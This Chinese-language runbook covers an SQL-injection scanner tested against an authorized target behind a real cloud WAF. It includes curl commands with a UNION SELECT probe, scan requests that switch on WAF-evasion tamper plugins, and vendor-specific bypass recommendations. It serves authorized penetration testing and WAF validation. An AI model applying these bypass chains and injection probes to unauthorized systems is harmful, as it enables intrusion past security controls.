# WAF-v2 真实云 WAF 闭环 runbook（Cloudflare / AWS WAF + 授权靶机）

> 适用：本机对**自有 / 已授权**的目标，在真实云 WAF（Cloudflare、AWS WAF 等）后挂靶机，
> 用 sqli-scanner 复现"被 WAF 拦截 → 开 tamper 绕过 → 检出注入"的闭环。
> 沙箱不跑该数据；本文命令均在你本机执行，目标须为**你有权测试**的资产。
>
> 前置：WAF-v2 已落地（`WAF_RULES` 约 30 vendor、`WAF_RECOMMEND_MAP` 已扩、启动期静态断言已挂）。
> 本地 mock-WAF 实验室（见 `e2e/waf-lab/`）用于无外部资源时复现同一机制。

---

## 0. 前置条件

1. 本仓库已 `npm install`（根）与 `cd server && npm install`（引擎），依赖齐备。
2. 一台**有注入点的授权靶机**（如 `http://target.example.com/vuln?id=1`，已知 `id` 可注入）。
3. 靶机前置云 WAF 已开启（Cloudflare / AWS WAF），且对 SQLi 特征返回 403/拦截页。
4. 本工具后端可启动：`cd server && node index.js`（默认监听 `:4567`，见 `server/index.js`）。
5. 合规确认：目标域名、WAF 均为你所有或已获书面授权；仅做检测，不开 `enableExtract` 拖库、不开 `secondOrder` 写请求，除非额外授权。

---

## 1. 在 WAF 后挂靶机，确认"裸请求即被拦截"

用 curl 直接打靶机（不经本工具），确认 WAF 对已带 SQLi 特征的请求拦截：

```bash
# 良性请求应放行（2xx）
curl -s -o /dev/null -w "%{http_code}\n" "http://target.example.com/vuln?id=1"

# 带 UNION SELECT 的裸请求应被 WAF 拦截（403 或拦截页）
curl -s -o /dev/null -w "%{http_code}\n" "http://target.example.com/vuln?id=1%20UNION%20SELECT%201,2"
```

若裸 SQLi 请求未被拦截，说明 WAF 规则未覆盖该特征，本文的"绕过"前提不成立——先调 WAF 规则。

---

## 2. 启动本工具后端，用 tamper 关扫描

启动后端（另一终端）：

```bash
cd server && node index.js
```

发起一次 **tamper 关** 的扫描（观察 WAF 识别与建议，但先不绕过）：

```bash
# 启动扫描（tamper 关）
curl -s -X POST http://localhost:4567/api/scan/start \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://target.example.com/vuln?id=1","config":{"techniques":["union","error","boolean"],"wafEvasion":{"tamper":{"enabled":false,"plugins":[],"intensity":"medium"}}}}'
# 返回 { "code":0, "data":{ "scanId":"<ID>" } }
```

通过 SSE 实时流观察 `waf_detected` 事件（识别到 WAF 时推送 `vendors` + `suggestions`）：

```bash
curl -N "http://localhost:4567/api/scan/<ID>/events"
```

前端 `WafTamperPanel` 会消费 `waf_detected` 的 `vendor` + `plugins` 建议流（约 30 vendor 自动生效，前端零改动）。

读取报告（重点看 `summary.wafDetected` 与 `vulns`）：

```bash
curl -s "http://localhost:4567/api/scan/<ID>/report" | head -c 2000
```

预期：因 WAF 拦截，本次 `vulns` 很少或为空（与本地 e2e 的 configA 一致：检出率低）。

---

## 3. 一键应用推荐组合 + 显式开 enabled，复扫

把第 2 步 `waf_detected` 建议里的 `plugins` 填入 tamper，并**显式 `enabled:true`**：

```bash
curl -s -X POST http://localhost:4567/api/scan/start \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://target.example.com/vuln?id=1","config":{"techniques":["union","error","boolean"],"wafEvasion":{"tamper":{"enabled":true,"plugins":["space2comment","randomcase","charencode"],"intensity":"medium"}}}}'
```

> 说明：真实云 WAF 的绕过组合建议用 `WAF_RECOMMEND_MAP` 的推荐（如 ModSecurity→`modsecurityversioned` 系列、Imperva→`securesphere`、F5/Citrix→`space2plus`）。
> 注意 `randomcase` 会随机化输出大小写——对"回显标记确认"类检测（如本仓库 UnionDetector 用 `SQLISCANNER0` 标记确认）可能干扰确认；
> 若你的靶机靠回显标记判定 union，优先 `space2comment`/`charencode` 这类不改字母大小写的插件。

等待完成并读取报告：

```bash
curl -s "http://localhost:4567/api/scan/<ID2>/report" | head -c 2000
```

---

## 4. 对比两次报告：先看有效性，再看 WAF 侧

两次报告都看 `vulns.length`（确认 vulnerable 的注入点数）与 `points.length`（总注入点）：

```bash
echo "关:"; curl -s "http://localhost:4567/api/scan/<ID>/report"  | node -e "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{const r=JSON.parse(s).data;console.log('points',r.points.length,'vulns',r.vulns.length)})"
echo "开:"; curl -s "http://localhost:4567/api/scan/<ID2>/report" | node -e "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{const r=JSON.parse(s).data;console.log('points',r.points.length,'vulns',r.vulns.length)})"
```

**`vulns` 两侧都必须 >0**，这是有效性前提而非成绩：零检出说明 payload 没被执行，此时"关 vs 开"比的是噪声（或"谁也没打进去"），任何下降/上升都推不出绕过与否。

检出数本身**不是**绕过的判据：单个注入点上 error/boolean 通道常在两种配置下都打满 100%，触顶后比较不出差异。真正的判据在 WAF 侧 —— 关 tamper 的拦截率须明显高于开 tamper，且 `942141`(extractvalue)/`942142`(updatexml)/`942180`(information_schema) 这类"函数名 + `\s*\(` 锚定"的高危规则命中须下降。

**先问这张 A/B 表跑在哪一档**（2026-09-25 逐档实测：真 MySQL 与 H2/HSQLDB/Derby 三个 Java 引擎同形）。
PL1（CRS 官方默认部署）下现有探针本来就能通过 ⇒ 挂链"无增益"是**正常形状**（8/8）；
**PL2 是全仓目前唯一量到"挂链有净收益"的档**（0 → 1 个技术位，orderby 的 error 通道）；
PL3/PL4 全拦（0/0），那说明 payload 整条没送达，**不能**读成扫描器不行，也不能读成 WAF 一定挡得住。
断崖在 **PL1→PL2** 之间，之后是平的 —— 所以"两侧同为 0"和"两侧同为满值"这两档都要先报档位再报结论
（本仓产物把档位写进抬头与文件名：`waf-real-report.md` = PL1 口径，`waf-real-report.pl2.md` = PL2；
改档跑不会覆盖默认那份）。基线值与逐档复测命令在 `e2e/waf-real/waf-bits-baseline.json`。

可复现的 A/B 装置（真 MySQL 真注入点 + WAF 中间件，自起隔离沙箱，不依赖外部资源）：

```bash
python e2e/waf-lab/compare-real.run.py   # 产物 e2e/waf-lab/results/compare-real.{json,md}
```

退出码即判据：`e2e/waf-lab/metrics.js` 的 `evaluateAbExperiment()` 三条件（两侧均有检出 && 拦截率下降 && 高危命中下降）全真才返回 0；检出侧为 0 时报告印「实验不成立」并以非 0 退出。

> ⚠️ `e2e/waf-lab/compare.e2e.js`（`npm run waf-e2e`）**已于 2026-09-18 废弃**：它用的 `/vuln` 端点是纯字符串回显、不执行任何 SQL，union/error/boolean 三种技术都不可能产生信号 ⇒ 两侧 `vulns` 恒为 0，产出的"对照表"没有信息量。文件头部已有标注，勿再用它判断 tamper 效果。

---

## 5. 收尾与合规提示

- 仅对**授权**目标执行；记录目标、时间、授权凭据，审计留痕。
- 检测完成后关闭不必要的 tamper / 限速，避免对目标造成压力。
- 不在未授权系统上运行；不开启 `enableExtract`（拖库）、`secondOrder`（写请求）除非额外书面授权。
- 本报告与 `results/compare-real.json` 仅用于你自己的整改验证；对外披露前脱敏。
  （旧夹具那份 `results/compare.{json,md}` 已于 2026-09-25 删除：它是结构上不可能成立的
  A/B 留下的"对照表"，留着只会被当成证据。）

---

## 附：常见现象对照

| 现象 | 含义 | 处理 |
|------|------|------|
| 关 tamper 也检出 | 靶机 WAF 规则未覆盖该注入向量 | 先调 WAF 规则，再回来验证 |
| 开 tamper 仍 0 检出 | 绕过组合不对 / 靶机非回显注入 | 换 `WAF_RECOMMEND_MAP` 推荐或加 `space2plus`/`percentage` |
| `waf_detected` 无建议 | 指纹阶段未抓到该 WAF 特征 | 检查 `WAF_RULES` 是否覆盖该 vendor；必要时补 matcher |
| 报告 `summary.wafEvasion.tamper.enabled=false` | tamper 未真正开启 | 确认请求体 `wafEvasion.tamper.enabled:true` |
